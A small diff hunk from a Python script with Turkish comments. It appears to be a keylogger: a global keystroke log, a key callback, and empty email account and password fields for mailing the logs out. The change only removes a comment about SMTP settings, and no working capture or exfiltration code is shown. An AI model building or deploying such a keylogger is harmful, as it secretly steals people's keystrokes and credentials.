@@ -4,7 +4,7 @@ import threading
 capslock=0
 log="" #globalde boş bir string oluşturduk.
 Mail_hesabi= "" #Buraya Mail gönderme işleminde kullanacağınız mail ve şifreyi girmelisiniz. 
-Sifre="" #Ancak gireceğiniz mail hesabında birtakım ayarlar yapmanız gerekmekte. "https://www.letscodemore.com/blog/smtplib-smtpauthenticationerror-username-and-password-not-accepted/" Ayarlara buradan ulaşabilirsiniz.
+Sifre=""
 
 def call_back(key):
     global log #globaldeki log'a ve capslock'a eriştik.
